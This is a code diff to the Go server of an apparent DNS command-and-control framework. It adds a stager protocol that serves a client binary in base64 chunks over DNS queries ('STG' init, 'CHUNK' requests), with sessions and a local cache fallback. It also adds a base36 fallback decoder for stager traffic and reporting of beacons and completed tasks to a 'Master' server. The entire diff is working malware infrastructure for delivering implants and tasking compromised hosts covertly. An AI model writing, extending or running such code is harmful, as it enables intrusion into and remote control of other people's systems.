@@ -104,17 +104,21 @@ type pendingLabelChunk struct {
 
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
-	ClientIP        string
-	OS              string
-	Arch            string
-	Chunks          []string // Base64-encoded chunks
-	TotalChunks     int
-	CreatedAt       time.Time
-	LastActivity    time.Time // Updated on each chunk request to prevent premature expiration
-	StartedAt       time.Time // When first chunk was requested
-	LastChunk       *int      // Last chunk index sent (pointer to differentiate nil from 0)
-	ProgressRunning bool      // Track if progress updater is running
-	ProgressDone    chan bool // Signal to stop progress updater
+	ClientIP           string
+	ClientBinaryID     string // Binary ID from Master
+	SessionID          string // Session ID for tracking
+	OS                 string
+	Arch               string
+	Chunks             []string // Base64-encoded chunks
+	TotalChunks        int
+	DeliveredCount     int // Number of chunks delivered
+	LastChunkDelivered int // Last chunk index delivered
+	CreatedAt          time.Time
+	LastActivity       time.Time // Updated on each chunk request to prevent premature expiration
+	StartedAt          time.Time // When first chunk was requested
+	LastChunk          *int      // Last chunk index sent (pointer to differentiate nil from 0)
+	ProgressRunning    bool      // Track if progress updater is running
+	ProgressDone       chan bool // Signal to stop progress updater
 }
 
 // C2Manager handles beacon management and tasking
@@ -1657,11 +1661,29 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	payloadParts := parts[:len(parts)-len(domainParts)]
 	encodedPayload := strings.Join(payloadParts, "")
 
-	// Decode payload
+	// Decode payload - try encrypted first (for beacons), then plain base36 (for stagers)
 	decoded, err := c2.decodeBeaconData(encodedPayload)
 	if err != nil {
-		// Not a valid beacon query
-		return "", false
+		// AES-GCM decryption failed - try plain base36 decode (for stagers)
+		decoded, err = base36DecodeString(encodedPayload)
+		if err != nil {
+			// Not a valid beacon or stager query
+			return "", false
+		}
+		// Check if this looks like a stager message
+		if !strings.HasPrefix(decoded, "STG|") && !strings.HasPrefix(decoded, "CHUNK|") {
+			// Not a recognized stager message, and AES decryption failed
+			return "", false
+		}
+		// It's a stager message - continue processing
+		if c2.debug {
+			logf("[C2] Decoded stager message (plain base36): %s (from %s)", decoded, clientIP)
+		}
+	} else {
+		// Debug: Log the decoded beacon message
+		if c2.debug {
+			logf("[C2] Decoded beacon message: %s (from %s)", decoded, clientIP)
+		}
 	}
 
 	// Parse beacon data - STRICTLY pipe-delimited for DNS C2
@@ -1735,6 +1757,11 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 						logf("[DB] Failed to update beacon status: %v", err)
 					}
 				}(beacon.ID)
+			}
+
+			// Report updated LastSeen to Master
+			if masterClient != nil {
+				go masterClient.ReportBeacon(beacon)
 			}
 		}
 
@@ -1852,6 +1879,8 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			return "ACK", true // Already processed or unknown
 		}
 
+		// Capture values before deleting
+		totalChunks := expected.TotalChunks
 		// Reassemble result
 		fullResult := strings.Join(expected.ReceivedData, "")
 		delete(c2.expectedResults, taskID)
@@ -1884,11 +1913,129 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			c2.mutex.RUnlock()
 
 			if isMasterTask {
+				// Submit the assembled result to Master
 				go masterClient.SubmitResult(masterID, beaconID, 0, 1, fullResult)
+				// Signal completion to Master so it marks task as completed
+				go masterClient.MarkTaskComplete(masterID, beaconID, totalChunks)
 			}
 		}
 
 		return "ACK", true
+
+	case "STG":
+		// STG|IP|OS|ARCH|timestamp - Stager initialization request
+		// Stager is requesting the client binary
+		if len(msgParts) < 4 {
+			return "", false
+		}
+		stagerIP := msgParts[1]
+		osType := msgParts[2]
+		arch := msgParts[3]
+
+		logf("[Stager] Init request from %s (os=%s, arch=%s)", stagerIP, osType, arch)
+
+		// Forward to Master to get session info and total chunks
+		if masterClient != nil {
+			sessionInfo, err := masterClient.InitStagerSession(stagerIP, osType, arch)
+			if err != nil {
+				logf("[Stager] Failed to init session with Master: %v", err)
+				return "", false
+			}
+
+			// Store session locally for chunk tracking
+			c2.mutex.Lock()
+			c2.stagerSessions[stagerIP] = &StagerSession{
+				ClientIP:       stagerIP,
+				SessionID:      sessionInfo.SessionID,
+				OS:             osType,
+				Arch:           arch,
+				TotalChunks:    sessionInfo.TotalChunks,
+				DeliveredCount: 0,
+				StartedAt:      time.Now(),
+				LastActivity:   time.Now(),
+			}
+			c2.mutex.Unlock()
+
+			// Return META response (will be base36 encoded by main.go)
+			return fmt.Sprintf("META|%s|%d", sessionInfo.SessionID, sessionInfo.TotalChunks), true
+		}
+
+		// No Master connection - check local cache
+		c2.mutex.RLock()
+		cachedChunks, hasCached := c2.db.GetCachedStagerChunks()
+		c2.mutex.RUnlock()
+
+		if hasCached && len(cachedChunks) > 0 {
+			sessionID := fmt.Sprintf("local-%d", time.Now().UnixNano())
+			c2.mutex.Lock()
+			c2.stagerSessions[stagerIP] = &StagerSession{
+				ClientIP:     stagerIP,
+				SessionID:    sessionID,
+				OS:           osType,
+				Arch:         arch,
+				TotalChunks:  len(cachedChunks),
+				Chunks:       cachedChunks,
+				StartedAt:    time.Now(),
+				LastActivity: time.Now(),
+			}
+			c2.mutex.Unlock()
+			return fmt.Sprintf("META|%s|%d", sessionID, len(cachedChunks)), true
+		}
+
+		logf("[Stager] No Master and no cached chunks available")
+		return "", false
+
+	case "CHUNK":
+		// CHUNK|chunk_index|IP|session_id|timestamp - Request for a specific chunk
+		if len(msgParts) < 4 {
+			return "", false
+		}
+		chunkIndex, _ := strconv.Atoi(msgParts[1])
+		stagerIP := msgParts[2]
+		sessionID := msgParts[3]
+
+		if c2.debug {
+			logf("[Stager] Chunk request: index=%d, session=%s, ip=%s", chunkIndex, sessionID, stagerIP)
+		}
+
+		// Get session info
+		c2.mutex.RLock()
+		session, exists := c2.stagerSessions[stagerIP]
+		c2.mutex.RUnlock()
+
+		if !exists || session.SessionID != sessionID {
+			logf("[Stager] Unknown session %s from %s", sessionID, stagerIP)
+			return "", false
+		}
+
+		// Update activity
+		c2.mutex.Lock()
+		session.LastActivity = time.Now()
+		c2.mutex.Unlock()
+
+		// Get chunk from Master
+		if masterClient != nil {
+			chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
+			if err != nil {
+				logf("[Stager] Failed to get chunk %d: %v", chunkIndex, err)
+				return "", false
+			}
+
+			// Update progress
+			c2.mutex.Lock()
+			session.DeliveredCount = chunkIndex + 1
+			session.LastChunkDelivered = chunkIndex
+			c2.mutex.Unlock()
+
+			// Log progress
+			c2.logStagerProgress(session, chunkIndex, clientIP)
+
+			// Return chunk (CHUNK|base64_data - NOT base36 encoded, sent as plain text)
+			return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData), true
+		}
+
+		logf("[Stager] No Master connection for chunk request")
+		return "", false
 
 	default:
 		if c2.debug {
